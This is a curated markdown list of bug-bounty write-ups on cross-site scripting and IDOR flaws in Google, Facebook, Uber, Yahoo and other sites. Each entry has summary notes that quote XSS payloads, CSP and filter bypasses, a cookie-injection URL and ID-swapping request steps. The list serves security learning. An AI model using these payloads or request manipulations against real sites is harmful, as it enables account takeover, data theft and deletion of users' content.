### Cross-Site Scripting (XSS)

- [Blind XSS for beginners](https://medium.com/bugbountywriteup/blind-xss-for-beginners-c88e48083071) by Syntax Error
  - How to register in XSShunter (`https://xsshunter.com/`), where to spray the payload.
- [XSS Polyglot Challenge](https://polyglot.innerht.ml/) by ?
  - Because of polyglot, payloads listed in this here are very useful to hunt blind XSS.
- [Stored, Reflected and DOM XSS in Google for Work Connect (GWC)](http://respectxss.blogspot.com/2016/02/stored-reflected-and-dom-xss-in-google.html) by Ashar Javed
  - Stored XSS - title of the post entered by user was encoded properly, but not the one created by the Google Drive file.
  - Reflected XSS - an error message in a GET parameter.
  - DOM XSS - Javascript code executes only if someone marked/clicked the reply of a posting "Mark as Helpful".
- [XSS in Google Colaboratory + CSP bypass](https://blog.bentkowski.info/2018/06/xss-in-google-colaboratory-csp-bypass.html) by Michał Bentkowski
  - Most markdown parsers allow you to use HTML syntax directly.
  - A very common way to inject JS code in markdown parsers is to use hyperlinks with `javascript:` protocol. For example, the code: `[CLICK](javascript:alert(1))`.
  - Find the frameworks used behind the scene, and read the documents of the products.
  - [This presentation](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf) showed that you can use a lot of popular JS framework to bypass various mitigations aganist XSS-es, including CSP. In the presentation you can also find a slide which shows what kind of security measure you can bypass with a given framework.
  - Rewriting the something already existed is a good idea.
- [Another XSS in Google Colaboratory](https://blog.bentkowski.info/2018/09/another-xss-in-google-colaboratory.html) by  Michał Bentkowski
  - Keep thinking, a tiny difference maybe matters.
  - This writeup showed how to bypassing the previous fixed.
- [Use XSS and Bug Chain to Bypass Google Account Recovery Restriction](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss) by Ramzes
  - This writeup was writen by Google security team member, complicated.
  - Account recovery is complex. Many of the reports "Google VRP" receive are the result of small-scale testing, like creating a new account and then trying to recover it from the same machine, browser, and IP address. In these cases, their system can assume with fidelity that the recovery is attempted by the legitimate owner of the account, so a successful recovery attempt is unlikely to signify a real security bug.
  - A XSS vulnerability in the API that many Google web applications use to display help articles inline without navigating to the "Google Help Center".
    - The iframe is responsible for displaying the help article. This "content frame", which is served from the `www.google.com` domain, uses an API to retrieve the HTML code of the article to display. The API endpoint is on a different domain, the "comtent frame" communicates with it (via the `postMessage()` method) using an iframe ("communication frame") served from that domain.
    - The source of the problem was that the URL of the "communication frame" is user-controllable, through a URL parameter of the content frame. Previously it was possible to specify a `javascript: URL`, which was then set as the "communication frame" URL, leading to direct "JavaScript execution". This problem was fixed by limiting the URL scheme to `https://`, but providing an arbitrary `https://` URL is also dangerous. With an arbitrary URL, an attacker-controlled page in the "communication frame" could send a message (containing HTML) to the "content frame", and the "content frame" sould display that as a help article.
    - The next stage of the payload can then run on `www.google.com`, starting the recovery process by entering the target account email address.
  - The next step of the recovery process asks for the last known password. This form is served from a differen domain `accounts.google.com`.
    - After the form is submitted in the first step, serveral HTTP redirects occur, resulting in a final URL that contains a "token". The form in step 2 can only be submitted via the URL that contains the "token", so it acts as a "CSRF token". The CSRF protection could be bypassed with an XSS attack on the `accounts.google.com` domain. But the "attack surface" on that domain is quite small, only a handful of applications are hosted there, so finding XSS vulnerabilities is difficult. Instead, the exploit used a different solution.
    - To get the "CSRF token", the exploit has to follow the redirect chain and read the final URL. However, as far as we know, it's not possible to read cross-origin redirect URLs in the browser under the circumstances required for this bug. Tha's because the "same-origin" policy prevents reading cross-origin redirect URLs via the XMLHttpRequest and fetch APIs. It could be done with a server-side component, but the intermediate steps of the redirect chain use HTTP-only cookies to identify the user, and those cookies cannot be read and transferred to the server.
    - But the last HTTP request to the `www.google.com` domain works even without cookies, and the final redirect target URL depends only on a state parameter in the URL, passed to this step from the previous redirect.
    - This way, it's possible to simulate a user clicking the second button ("I don't konw any pervious password") and submit the form without entering a password.
  - The account recovery process continues, back on the `www.google.com` domain. Step 3 asks the user to choose from two options. The exploit chooses the "Verify your identity" option, since this way, it will be possible to send the "password reset link" to the attacker's email address (after completing a questionnaire).
  - Even if an attacker can get this far, a knowledge test must be passed before a "password reset link" can be sent to the attacker's email address.
    - If the exact account creation date and last login date are known, this variant of the knowledge test can be short-circuited. But that information is very hard to guess, unless you're logged in and find a page where both of these dates are explicitly listed. As it turns out, there was indeed a page like that on the domain where the XSS payload was running, so the dates could easily be read.
  - Finally, after the responses to the questions are submitted, the account recovery process is complete and the "password reset link" is sent to the email address povided by the attacker.
  - Fixes:
    - The help API now checks that the URLs f iframes used for cross-domain communication confirm to a very strict whitelist.
    - Added checks that prevent the "CSRF token" generation from being delegated to a server-side component.
    - Fixed the information leak by removing the dates from the migration page.
- [Uber Bug Bounty: Turning Self-XSS into Good-XSS](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/) by Jack Whitton
  - Payload (`1<script>alert(document.domain);</script>`) in drivers' profile on Uber's Partners protal was triggered, but this was a self-XSS.
  - OAuth login flow without `state` parameter introduced a  CSRF vulnerability in the login function, there is a CSRF vulnerability in the logout function too.
  - Since our payload is only available inside our account, we want to log the user into our account, which in turn will execute the payload. However, logging them into our account destroys their session, which destroys a lot of the value of the bug (it's no longer possible to perform action on their account).
  - Chaining minor bugs: First, log the user out of their `partner.uber.com` session, but not their `login.uber.com` session, this ensures that we can log them back into their account. Second, log the user into our account, so that our payload will be executed. Finally, log them back into their account (this must be in an iframe), whilst our code is still running, so that we can access their details (create another iframe to grab some of their data).
  - Using "Content Security Policy" to define which sources are allowed to be loaded could stop browser following 302 redirection (If this works, CSP violation error message will show in "Console" in Chrome debug tool).
  - The payload in this writeup is worth to study.
- [AirBnb Bug Bounty: Turning Self-XSS in Ture-Client-IP Header into Good-XSS #2](http://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/) by geekboy
  - Instead of normal XSS Payload, injected remote hosted JS.
  - Victim to login into attacker's account via CSRF.
  - Attacker's remote hosted JS will get executed.
  - JS will perform 5 actions in iframe which are as follows:
    - Victim will get logged out from attacker's account.
    - Victim will get logged into his account via "Google Signin".
    - Attacker will navigate to "Profile Setting" page.
    - Attacker will extract the CSRF token from source code.
    - Attacker will update the victim email.
- [Turning Self-XSS into Good XSS in Uber v2: Chanllenge Completed but Not Rewarded](https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html) by httpsonly
  - User can be authenticated on `m.uber.com` by only presenting COOKIE `token`. Hence, if it is somehow possible to login victim user into our account with self-XSS, it is possible to steal `oauth2` cookie of a real user and perform any other malicious actions (since it is scoped to `subdomain.uber.com`).
  - Arbitrary cookie install vulnerabilty was found on page `https://business.uber.com/new/confirm/[exploit-here]`, band is based on the fact that user input comes into server's response, directly into Cookie header and is not properly sanitized. Hence, it was possible to install various cookie for any `subdomain.uber.com`. Payload: `https://business.uber.com/new/confirm/test;,arbitrary=cookie;domain=.uber.com`.
- [Self-XSS + CSRF to Stored XSS](https://medium.com/@renwa/self-xss-csrf-to-stored-xss-54f9f423a7f1) by Renwa
  - The author found a XSS by changing his name to a milicious payload (`"><svg onload=alert(document.domain)>`) in the profile page. This is a self-XSS.
  - But "change profile action" wasn't protected by CSRF, so the we can execute our payload against other users by changing their profile. This is also a blind XSS, the author used XSShunter.
  - This maybe the easiest way to turn self-XSS into strored XSS.
- [ACCOUNT TAKEOVER AND BLIND XSS! GO PRO, GET BUGS!](https://blog.witcoat.com/2018/05/30/account-takeover-and-blind-xss-go-pro-get-bugs/) by Tabahi
  - An IDOR allowed attacker to create an `element x` in every user's account, the text field of `element x` was also velnerable to stored XSS, payload `'%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.cookie)%3E`.
  - Attacker could store XSS in every user's account through the IDOR. There was no CSP blocking external scripts, so attacker could just write a small script which would steal a victim's CSRF token and then change their emailID or invite the attacker as an Admin, taking over their account.
  - The proc in this writeup is worth to study, and also try to maximize the severity.
  - An invoice was generated using some fiels supplied by the user at the time of billing. Inject some html elements and also put some blind XSS payload. The author used XSShunter and a blind XSS payload had triggered on the program's Admin Panel.

#### Reflected Cross-Site Scripting (Reflected XSS)

- [Managed Apps and Music: a tale of two XSSes in Google Play](https://ysx.me.uk/managed-apps-and-music-a-tale-of-two-xsses-in-google-play/) by Yasin Soliman
  - This blog listed some google resources that are very useful for google bug hunters.
  - Payload `https://play.google.com/schools/termsofservice?continue=javascript:confirm(document.domain)` (two limitions for exploitaiton).
  - Payload `https://play.google.com/music/listen?u=0#/sr/'"><img src=x onerror=confirm(document.domain)>` (straightforward, actually this was a stored XSS).
- [Filter Bypass to Reflected XSS on https://finance.yahoo.com (mobile version)](https://medium.com/@saamux/filter-bypass-to-reflected-xss-on-https-finance-yahoo-com-mobile-version-22b854327b27) by Samuel
  - In the hunting process, the author detected some websites that are responsive in a mobile way. The author tried to find any bugs on the website `https://finance.yahoo.com`, but he didn't find anything, so he decided to find bugs in the mobile version of this website.
  - Payload `https://finance.yahoo.com/quote/"></script><svg onload=alert(1)>` was processed in capital letters, and `alert` in capital letters does not work. This could be bypassed using `&#97;&#108;&#101;&#114;&#116;` ("alert" HTML character encoding).
  - Final payload `https://finance.yahoo.com/quote/"></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>`.
- [DOM XSS - auth.uber.com](http://web.archive.org/web/20180331193745/http://stamone-bug-bounty.blogspot.com/2017/10/dom-xss-auth_14.html) by StamOne
  - There is no redirect using location header and the response code is 200 but the author still got redirected, which can mean only one thing, the redirect performed using javascript in the browser. Usually it means something like this: `window.location.href = nextURL;`. In theory if someone can control the `nextURL` parameter, he can perform XSS: `window.location.href = javascript:alert(1);//` or `window.location.href = data:text/html;HTML_CODE`.
  - By removing the "Content Security Policy" header from the response, we could check if the alert box not popping because of CSP. Or we could check CSP violation error message in "Console" in Chrome debug tool.
  - I don't understand this writeup, but the previous two tips are useful.
- [How I XSS’ed Uber and Bypassed CSP](https://medium.com/@efkan162/how-i-xssed-uber-and-bypassed-csp-9ae52404f4c5) by Efkan
  - Using Google dork to find a invite URL contains three parameters, parameter `v` was not sanitized.
  - Code after injecting payload: `content="static/images/milestones/anniversary/anniversary_1"><img src=x onerror=alert(document.cookie)>.png"/>`. As you can see, there was no filtering but in the meantime there was no XSS pop-up, blocked by "Content Security Policy" (We could confirm this by removing the CSP header from the response or checking CSP violation error message in "Console" in Chrome debug tool).
  - "script-src" in CSP header includes `subdomain.uber.com`, if we could find any JSON endpoint with callback or anything similar, then we are able to execute XSS (why? see flowing payload).
  - Payload: `https://partners.uber.com/p3/referrals/ms?i=bq6ew1w9ue&m=ANNIVERSARY&v=1"><script src=”https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);"></script>`.
  - The author was inspired by [this writeup](http://web.archive.org/web/20180331193745/http://stamone-bug-bounty.blogspot.com/2017/10/dom-xss-auth_14.html) to come up with the endpoint to bypass CSP.
- [Making an XSS triggered by CSP bypass on Twitter](https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5) by tbmnull
  - The author used whitelist vulnerable URL to bypass CSP.
  - Payload: `https://careers.twitter.com/en/jobs-search.html?location=1"><script src=//analytics.twitter.com/tpm?tpm_cb=alert(document.domain)>//`.
- [XSS on Bugcrowd and so many other website's main Domain](http://witcoat.blogspot.com/2017/06/xss-on-bugcrowd-and-so-many-other.html) by Bull
  - `local` parameter in the 404 page URL of Bugcrow is vulnerable to XSS (payload: `<svg/onload=alert(1)>`), also in the homepage URL (`https://bugcrowd.com?locale=xss`).
  - This was a vulnerability in Locomotive CMS, so it affected many other website which used Locomotive CMS.
- [Story of Parameter Specific XSS](https://www.noob.ninja/2017/09/story-of-parameter-specific-xss.html) by Noob Ninja
  - URL: `https://www.private-bounty.com/Deactivate?view=aaa&utm_content=foo&utm_medium=bar&utm_source=baz` was reflected in the page in Javascript context as: `https://www.private-bounty.com/Deactivate?utm_content=foo&utm_medium=bar&utm_source=baz`, but the values of the parameters were properly encoded.
  - The author found the pattern of `utm_content=foo&utm_medium=bar&utm_source=baz` on every endpoint getting reflected and no other parameter will be reflected. The author tried to append a random custom parameter to see if it gets reflected, but it didn't work.
  - Following the original pattern, the author appended parameter with `utm_` prefix, this parameter was not being encoded when reflected in the page. Payload: `https://www.private-bounty.com/Deactivate?utm_content=foo&utm_medium=bar&utm_source=baz&utm_foobarbaz');alert(1)//`.
  - This writeup show us a way to find hinden parameter in URL.
- [DOM based XSS - or why you should not rely on Cloudflare too much](https://medium.com/bugbountywriteup/dom-based-xss-or-why-you-should-not-rely-on-cloudflare-too-much-a1aa9f0ead7d) by KatsuragiCSL
  - The author registered an account using email *a@a.com* without verifying it and tried to sighup with the same email again. Then an error message is popped up and the vaule of the `Message` parameter in URL is reflected in error message.
  - Just set the vaule of the `Message` parameter to `<script>alert(1)</script>`, the URL was blocked by Cloudflare.
  - The the content of the `Message` parameter is inserted in javascript directly ("view page source"), so payload: `alert("something_here");evil_script_here// ")`.
  - Good firewalls can't save bad code.
- [Two XSSed in ucweb.com ( Alibaba’s Bug Bounty Programme) - Story about my first bug bounty](https://medium.com/@sudhanshur705/story-about-my-first-bug-bounty-9fe710be8241) by Sudhanshu Raj
  - The author checked the available subdomains by using `https://virustotal.com` and started going through them one by one.
  - Just random picked `samsung.ucweb.com` and got "403 Forbidden". If you encounter any page like this google the site you may find an endpoint which is accessible.
  - `title` in `http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&title=LifeStyle` (found by using google dork: `site:samsung.ucweb.com`) was not filtered, malicious payload `<img src=x onerror=alert(‘XSS’)>` was triggerred.
  - The company fixed the previous XSS by removing that endpoint and if the author tried to open that endpoint he got a "404 error not found".
  - Used dirsearch to search new endpoints and found `http://samsung.ucweb.com/test/`, in this page the author found a same url just like before: `http://samsung.ucweb.com/test/classify.html?dataKey=New&title=`, also same payload worked.

#### Stored Cross-Site Scripting (Stored XSS)

- [A Few of My Favorite Facebook Stored XSS Findings](http://www.breaksec.com/?p=6129) by Nirgoldshlager
  - Three old but interesting and critical Facebook strored XSSes which the author happened to find them in the right location.
- [XSS on Facebook-Instagram CDN Server bypassing signature protection](https://www.amolbaikar.com/xss-on-facebook-instagram-cdn-server-bypassing-signature-protection/) by Amol Baikar
- [XSS on Facebook’s acquisition Oculus CDN](https://www.amolbaikar.com/xss-on-facebooks-acquisition-oculus-cdn/) by Amol Baikar
  - Bypassing signature protection on Facebook's CDN server, uploading `.jpg` pictures containing malicious payload, accessing the `.jpg` by changing extion to `.html`.
- [Stored XSS in Google Drive (Folder Name)](https://pwnrules.com/google-drive-stored-xss/) by Ibrahim Raafat
  - An old blog, creating a folder with malicious payload name, searching about any place which need writing the folder name in the page.
- [Sleeping stored Google XSS Awakens a $5000 Bounty](https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/) by Patrik Fehrenbach
  - Payload (`"><img src=x onerror=javascript: alert(1);`) in project title was fired when delete the project.
  - This was not classified as a low level self XSS, because the Google Cloud Platform can be used by multiple users, if a user creates a project with a malicious XSS payload, that payload could be used against the project administrator to execute malicious javascript (if they delete the project).
- [Google adwords 3133.7$ Stored XSS](https://medium.com/@Alra3ees/google-adwords-3133-7-stored-xss-27bb083b8d27) by Emad Shanab
  - The author is a full time lawyer, in the writeup he shared how he choose his target.
  - Malicious payload (`"><svg/onload=alert(document.domain)>"@x.y`) in the conversation name was triggered.
- [Stored XSS, and SSRF in Google using the Dataset Publishing Language](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html) by Signal Chaos
  - The feature (parase user upload XML and also allow data to be retrieved from remote HTTP or FTP sources) of this product seems vulnerable.
  - Readers could learn how to write a similar proc in XML.
- [Google Assistant XSS Bug Worth $3133.7](https://medium.com/bug-bounty-hunting/google-assistant-bug-worth-3133-7-830a03724a04) by Circle Ninja
  - The author classify this as a reflected XSS, but I thought this is a stored XSS.
  - Saving some payloads on each field, no tags (< > etc.) were filtered, but the XSS never popped (why? I thought the author maybe miss something.)
  - using data uri and base64 enconding to create XSS (`"><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=”>click</a>"`).
- [XSSing Google Code-in thanks to improperly escaped JSON data](https://blog.thomasorlita.cz/vulns/google-code-in-xss/) by Thomas Orlita
  - Signing up Google Code-in and puting payload into all the text fields, when the author clicked the submit button, all the payloads were executed, and the payloads continued executing on every page the author visited. This alone didn't mean much as it would only classify as an Self-XSS, but meant that this didn't have to be the only place it was unescaped.
  - Payload (`"'><script src=x></script>{{1-1}}`) in the comments of tasks was fired.
- [Yahoo Mail stored XSS](https://klikki.fi/adv/yahoo.html) by Jouko Pynnönen
  - As most email solutions these days, Yahoo Mail dispalys HTML-formatted email messages after filtering any potentially malicious code. But certain malformed HTML code could pass the filter.
  - A message containing all known HTML tags and attributes was created to see which of them the Yahoo filter lets through. After viewing the resulting email, the author noticed that if certain, supposedly "boolean" HTM attributes were given a value, the value was removed by the filter, but the equals sign was not.
  - Example: `<INPUT TYPE="checkbox" CHECKED="hello" NAME="check box">` became `<INPUT TYPE="checkbox" CHECKED= NAME="check box">`
  - [HTML specification](https://www.w3.org/TR/html/syntax.html) alows "zero or more space characters" a round the equals sign in an unquoted attribute value.
  - Proc: `<img ismap='xxx' itemtype='yyy style=width:100%;height:100%;position:fixed;left:0px;top:0px; onmouseover=alert(/XSS/)//'>` became `<img ismap=itemtype=yyy style=width:100%;height:100%;position:fixed;left:0px;top:0px; onmouseover=alert(/XSS/)>` (some of the quote symbols edited for clarity).
  - The browser would render an IMG tag filling the entire window. The JavaScritpt code in the `onmouseover` attribute would be immediately executed, without further user interaction. Blocking or allowing images in mail setting didn't affecting this behavior (why?).
- [Yahoo Mail stored XSS #2](https://klikki.fi/adv/yahoo2.html) by Jouko Pynnönen
  - Composing an email containing different kind of attachments and sent it to an external mailbox, this way the author could inspect the "raw" HTML this kind of email contained.
  - "Share files from cloud providers" option won't create a traditional email attachment but inserts a HTML link to Google Docs or Dropbox along with some decorative HTML.
  - `data-*` HTML attributes are used to store application-specific data typically for Javascript use.
  - To get a more complete picture of the available `data-*` attributes, the author went to the source tab in Chrome's Developer Tools and looked for references to `data-url` in the JavaScript files that are loaded in the mail reading view.
  - Creating an email with abusive `data-*` attributes:
```
<div class="yahoo-link-enhancr-card" data-url="https://www.youtube.com/aaa&quot;&gt;&lt;img src=x onerror=alert(/xss/)&gt;&lt;">
<div class="card-share-container">
<a class="enhancr-play-btn"></a>
</div></div>
```

- [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd) by Mrityunjoy
  - This was a stored XSS on Snapchat Ads domain.
  - Create an ADS account with milicious payload (`test"><img src=x onerror=prompt<domain)>`) in "BUSINESS NAME" field.
  - Create an Organization and invite new members on the Organization via email address.
  - XSS POPUP on the invitation page rendered by the invitation link in the email.

### Insecure Direct Object Reference (IDOR)

- [How-To: Find IDOR (Insecure Direct Object Reference) Vulnerabilities for large bounty rewards](https://www.bugcrowd.com/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/) by Sam Houston
  - It needs to understand the application flow developed by the software developers. All the modules functions and their sub-modules functions need to be understand when the logged-in user into the web / mobile application. Roles in the application must be well understood in order to identify IDOR vulnerability. If you know what that a role should do or should not do, it will be very useful during the phase of weakness detection.
  - It is also important to remember that this vulnerability is as severe as XSS, CSRF in security testing and as a type of vulnerability that is not easily descovered.
  - You can use the browser's secrete tab to quickly practically test IDOR vulnerabilities. So when you use the regular tab as a normal user, you can use the secret tab as an attacker. This will ensure that you don't logout.
  - You can use Burpsuite's "HTTP history" for checking all of requests. Also, you can use Burpsuite's "scope" feature for fast testing. Because the "scope" feature can be useful to make a "target" list and the "scope" feature allows showing only relevant data for your testing "scope". You can edit "scope" value and then filter the "HTTP history" by selecting "Show only in-scope items". 
- [Hacking Facebook.com/thanks Posting on behalf of your friends](http://www.anandpraka.sh/2014/11/hacking-facebookcomthanks-posting-on.html) by Anand Prakash
  - "Say Thanks" is an experience that lets Facebook user to create personalized video cards for their facebook friends. A user needs to visit `facebook.com/thanks` and have to choose a friend. Once you are ready you have to click on the "Share" button and your video will be shared on your timeline with the friend tagged. It will show up on your's as well as the friend's timeline.
  - Two exploitable surfaces:
    - Posting on the behalf of non-Facebook friend.
    - Posting on the behalf of a Facebook friend.
  - Positing on behalf of your Facebook friends worked. Used Burpsuite to capture the request, changed the `sender={"id":XXXXXX,` to victim's `Facebook ID`, in few seconds video got posted from the victim's Facebook profile.
- [How I could have removed all your Facebook notes](http://www.anandpraka.sh/2015/12/summary-this-blog-post-is-about.html) by Anand Prakash
  - "Facebook Notes" are ways of writing entries about your life, your thoughts, or your all-time favorite songs and then sharing them with your Facebook friends. When ou publish a Note, it appears in your "News Feed".
  - Attack could have removed all your notes just by replacing his `note_id` with yours in note editing request. `node_id` can be seen by visiting victim's note and copying the `id` from the URL.
  - This writeup tells us, if there are some `id` in the request, replace it with it's peers, maybe something unexpected will happen.

  - Parse is a backend as a service providing company which was acquired by Facebook in 2013. In other words, they provide you with an application development platform in the cloud.
  - Apps created in Parse have a feature to export the reports in csv format. Clicked "download option", a request containing `appname` was generated, changed the `appname` to other app's, you could download other app's reports.
- [Delete any video from Facebook](https://pranavhivarekar.in/2016/06/23/facebooks-bug-delete-any-video-from-facebook/) by PRANAV HIVAREKAR
  - "video comment" feature allowed users to upload a video in comments.
  - The author started playing around and testing this feature to find out how it works after it was out 8 hrs.
  - When we upload a video as a comment, then this video gets uploaded onto user / page 's timeline and then it gets attached to the post as a "video comment" using it's `video_id`. e.g. When any user comments using a video on any random post, then video will first get uploaded to the user's timeline and then `video_id` will be returned. This `video_id` gets attached to the post as a video comment.
  - Two simple flaws:
    - The author was able to attach anyone's "video" to his comment using it's `video_id`.
    - When the author deleted his "comment", then attached "video" got deleted. As it used only `video_id` and there were no permission checks placed to verify if the "user" owned the "video".
  - The author used `GraphAPI` to write a proc.
- [Delete Any Video on Facebook](https://danmelamed.blogspot.com/2017/01/facebook-vulnerability-delete-any-video.html) by Dan Melamed
  - This vulnerability is similar to the previous one, instead of attaching the victim's video to a comment, the author discovered a way to attach the video to an event post, when you delete an event post it also deletes the attached video.
  - The author could created an event post by uploading a photo or video in the "Discussion" of a public event. You could upload victim's video by changing `video_id`. The attached video was deleted when you deleted the event post.
- [Image removal vulnerability in Facebook polling feature](https://blog.darabi.me/2017/11/image-removal-vulnerability-in-facebook.html) by Pouya Darabi
  - The author noticed that "polling feature" was added to the posts while he was checking out Facebook's new features.
  - Whenever a user tries to create a poll, a request containing "gif URL" or "image id" will be sent; when this field value changes to any other "image id", that image will be shown in poll; after sending request with another user's "image id", a poll containing that image would be created; when we try to delete the poll, victim's image would be deleted.
- [Facebook Page Takeover by Manipulating the Parameter](https://arunsureshkumar.me/index.php/2016/09/16/facebook-page-takeover-zero-day-vulnerability/) by Arun Sureshkumar
  - "Facebook Page" are for brands, businesses, organisations and public figures to create a presence on Facebook, whereas profiles represent individual people. Anyone with an account can create a page or help manage one, if they've been given a role on the page like admin or editor. People who like a Page and their friends can get updates in "News Feed". With a "Facebook Page", you can easily show customers what you're all about.
  - "Facebook Business Manager" lets businesses more securely share and control access to their ad accounts, Pages, and other assets on Facebook. Anyone in a business can see all of the Pages and ad account they work on in one place, withour sharing login information or being connected to their coworkers on Facebook. When you sign into "Business Manager", we'll show you a quick overview of the ad accounts and Pages that you work on. If you're the admin for your business, go to "Business Settings" to add new people, Pages, ad accounts and other assets to your business.
  - When you added a partner to your own business, a request containing `parent_business_id` (your own business id), `agency_id` (your partner's business id) and `asset_id` (didn't know what kind of asset) in POST parameter was generated. If you changed `asset_id` to the `page_id` you wanted to hack, and also interchanged the `parent_business_id` and `asset_id`, Page would be added to the "Facebook Business Manager" of the attacker with permission role "Manager".
- [A Simple Bug On Facebook That Is Worth $8000 - Page Download](https://medium.com/@ajdumanhug/a-simple-bug-on-facebook-that-is-worth-8000-b77f7e01b064) by Aj Dumanhug
  - After knowing there was a "Download Page" new feature, the author immediately searched for bugs in the new feature the day after.
  - If you're an "Admin", you can download a copy of your Page. But the author found that you could download a copy of a Facebook Page when you're an "Editor".
  - When you downloaded your "Admin" Page, changed `page_id` to your "Editor" Page, then you could download a copy of your "Editor" Page.
- [Disclose Private Video Thumbnail from Facebook WorkPlace](https://medium.com/bugbountywriteup/disclose-private-video-thumbnail-from-facebook-workplace-52b6ec4d73b7) by Sarmad Hassan
  - The author decided to test "Facebook Pages", because he knew through reading a lot of writeups, that Facebook pay good bounty when hunters find valid bugs on "Pages".
  - He created a test Page for himself and checked every option on it. After a little while he got "CANVAS", basically "Page Admin" or even an "advertiser" can create "CANVAS" and there is some options like upload photo or video inside of it.
  - The author uploaded his test video and saved it, then he edited the "CANVAS" by changing the title, when committed, a request containing `video_id` was generated, changed the `video_id` to any public video id, he could uploaded that public video to his "CANVAS".
  - When the author deleted his CANVAS's video, the original video wasn't deleted, which means this uploaded bug was only a N/A.
  - Just thought outside the box, every post in "Facebook Workplace" consider as private, like photos or videos, because only members of a company with then same email domain should have see their posts. So the author changed the `video_id` to a video from his "Workplace" test account.
  - After he refreshed the page and clicked on view option to see if he can view the video, again he couldn't see the video but noticed that there was a spinning icon for the video, which means the video is uploaded successfully but there is something blocking it to be previewed.
  - The author sent his canvas to his "Smart Phone" (because there was an option to send a preview of your canvas to your mobile device). Once he sent the canvas to his Smart Phone, he received a notification in his phone telling him "your canvas is ready to preview", clicked on it and he saw the video in his device, but he couldn't play the whole video, he was only able to see "Video Thumbnail".
  - Ability to see the "video thumbnail" in "workplace post" consider as a security issue, cause imagine these videos contain private information like meeting places, private emails, private titles for the company like prices, budgets, products sales figures or any private information that should not be visible to the public, not to mention private content of the video itself.
- [Add description to Instagram Posts on behalf of other users - 6500$](https://medium.com/bugbountywriteup/add-description-to-instagram-posts-on-behalf-of-other-users-6500-7d55b4a24c5a) by Sarmad Hassan
  - "IGTV" was a new feature on Instagram for watching long-form, vertical video from your favorite Instagram creators.
  - Once the author created an "IGTV video", he clicked on the edit option, a request containing `media_id` (you could get any `media_id` for other users posts by just visiting their posts and viewing the source code), `caption` and `title` (you could put description to that video or photo in these two parameters) was generated.
  - By replacing his `media_id` to other users post's `media_id`, the author could add description to their posts if they didn't put any description there. It worked in all kind of posts like photos, videos and IGTV videos. It worked only on public accounts.
  - The response was an "Internal Server error" with an error message "Oops an error occured", but instead the bug worked.
- [How I was able to delete any image in Facebook community question forum](https://medium.com/@JubaBaghdad/how-i-was-able-to-delete-any-image-in-facebook-community-question-forum-a03ea516e327) by Sarmad Hassan
  - The author came across "Facebook community question forum" and posted an answer with attached photo, then a request contained `attachment` (`attachment={“fbid”:275252333010477}`) in POST parameter was generated, which `fbid` was the id of any uploaded photo in Facebook. Changed `fbid` number with other use's `fbid` attached photo, you could attach other user's photo.
  - Because attacker and victim had the same `fbid` number, so deleted posted answer from attacker account might also delete the attached photo of victim. But when the author deleted his posted answer and refreshed the victim account page, the photo was still there.
  - Then he thought maybe it would take some time to be deleted in victim account, and refreshed victim page more than one minute later, the photo got deleted.
  - This bug also worked on by photo uploaded by Facebook help team itself and also worked on "Facebook workplace".
  - The author explained how he got the `fbid` number of other users account. There is a relationship in the "image URL link" between "second number" in the "image URL link" and a constant number equal to "3333333".
- [Facebook: Creating Test Conversion using any App](https://medium.com/bugbountywriteup/creating-test-conversion-using-any-app-8b32ee0a735) by Joshua Regio
  - The "Facebook ad account test" can help you understand how many sales or conversions your Facebook, Instagram and Audience Network ads are causing.
  - A malicious user can create test conversion using any `app_id` which could reveal the sales and conversions of an active campaign.
  - Go to `facebook.com/test-and-learn/?act=AD_ACCOUNT_ID`; set up "Test"; fill in the necessary information; intercept the request before creating a test; in the `/ad_studies` request, change the `app_id` to your victim's `app_id`; "Test Conversion" is created.
- [Taking over Facebook Accounts using Free Basics Partner Portal](https://www.josipfranjkovic.com/blog/facebook-partners-portal-account-takeover) by JOSIP FRANJKOVIĆ
  - The author found a vulnerability leadking email address of any Facebook user tuned out to be an "account takeover" with no user interaction needed.
  - One of the author's website was approved to participate in the "Free Basics project" by Facebook and he have gained access to their partners portal.
  - After poking around a bit, the author have realised adding a new "admin user" leaked their address in subsequent notification emails. Reproduce:
    - Using your "admin account", go to `https://partners.facebook.com/fbs/settings/`.
    - Input anything as the name, in the "email field" input an email you control.
    - Click "Add" and intercept the POST request to `/mobile/settings/requirements/save/`.
    - Change the `values[settings.users.userstablecontainer.user_id]` GET parameter to an "ID" of the victim whose email you want to get and forward the request.
    - An email will arrive to your controlled address, which will contain the victim's "primary mail" as part of `<a href link>`.
  - Basically, the author have added a new "admin", and set its partner notifications email to one he controlled. The notification email itself would leak the "admin's primary Facebook email" through a `n_m` GET parameter in one of the links.
  - Facebook's team then explained that another parameter from the "email link" could potentially be used to login to the user's account (with some restrictions), the author's test account didn't have the feature enabled.
- [How I hacked Tinder accounts using Facebook’s Account Kit](https://medium.freecodecamp.org/hacking-tinder-accounts-using-facebook-accountkit-d5cc813340d1) by Anand Prakash
  - Tinder is a location-based mobile app for searching and meeting new people. It allows user to like or dislike other users, and then proceed to a chat if both parties swiped right.
  - "Account Kit" is a product of Facebook that lets people quickly register for and log in to some registered apps by using just their phone numbers or email addresses without needing a password. It is reliable, easy to use, and gives the user a choice about how they want to sign up for apps.
  - The author discovered an "account takeover vulnerability" in Tinder's application. By exploiting this, an attacker could have gained access to the victim's "Tinder account", who must have used their "phone number" to log in. This could have been exploited through a vulnerability in "Facebook Account Kit".
